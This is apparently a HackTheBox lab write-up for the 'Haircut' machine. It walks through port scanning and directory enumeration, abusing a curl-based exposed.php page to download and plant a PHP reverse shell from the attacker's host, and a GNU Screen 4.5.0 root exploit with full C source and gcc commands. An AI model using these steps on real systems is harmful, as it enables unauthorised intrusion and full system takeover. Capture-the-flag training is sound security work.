# Recon

As usual we start with a port scan against the target:
```
sudo nmap -sV -p- -sC -oN nmap.txt -O 10.10.10.24 -T5
```

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Haircut/assets/1.png">

The scan results only show two open ports. We'll start with the webserver on port 80.

# Enumeration
As the website itself doesn't reveal anything we'll run gobuster on the target. We will also look for files using the ```-x php,hmtml``` argument.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Haircut/assets/2.png">

# Initial Foothold
```exposed.php``` looks interesting. It looks like it uses curl to download a given website. We can abuse this by letting it upload a reverse php shell. We download a [reverse php shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and change the IP and port to our attacking machine which has a listener ready.

We'll upload it to the ```/uploads``` directory found with gobuster. We'll probably have right permission on that folder. ```-o``` will save the file to the location provided.

```http://10.10.14.4:8000/shell.php -o uploads/shell.php```

Browsing to ```http://10.10.14.4:8000/shell.php``` will initiate the reverse shell.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Haircut/assets/3.png">

Like usual we'll upgrade the shell. Python was not installed but running ```which python3``` tells us that python3 is.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

Press ctrl+z key combination 

stty raw -echo; fg
```

# Privilege Escalation
We can search for interesting files with SUID set by running the following command:
```
find / -perm -4000 -exec ls -l {} \; 2>/dev/null 
```
We spot ```/usr/bin/screen-4.5.0``` which has an privilege escalation exploit available. But because we won't have permission to run ```gcc``` on our target we'll first prepare some things locally.

[GNU Screen 4.5.0 - Local Privilege Escalation](https://www.exploit-db.com/exploits/41154)

Create: libhax.c
```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

Create: rootshell.c
```
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

```
gcc -fPIC -shared -ldl -o libhax.so libhax.c
gcc -o rootshell rootshell.c 
```
This will return some errors but we can ignore them. The code refers to other locations than our attacking machine but after we transfer them to the host it'll work fine.

Now that we have created the files we download them to our target. We change the references in ```ld.so.preload``` and finally run our rootshell.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Haircut/assets/5.png">



